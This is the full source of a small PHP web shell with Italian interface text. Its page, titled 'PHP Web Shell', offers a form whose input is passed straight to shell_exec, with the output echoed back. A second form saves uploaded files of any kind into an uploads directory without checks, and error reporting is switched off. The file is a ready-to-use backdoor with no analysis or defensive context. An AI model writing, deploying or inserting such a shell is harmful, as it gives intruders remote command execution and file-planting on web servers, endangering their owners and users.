<?php

error_reporting(0);

 
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "<pre>". shell_exec($cmd) . "</pre>";
}

 
if (isset($_FILES['file'])) {
    $target_dir = "uploads/";
    $target_file = $target_dir . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        echo "File caricato con successo.";
    } else {
        echo "Errore nel caricamento del file.";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>PHP Web Shell</title>
<head>
<body>
    <form method="post">
        <input type="text" name="cmd" placeholder="Inserisci comando">
        <input type="submit" value="Esegui">
    </form>

    <form method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Carica">
    </form>
</body>
</html>

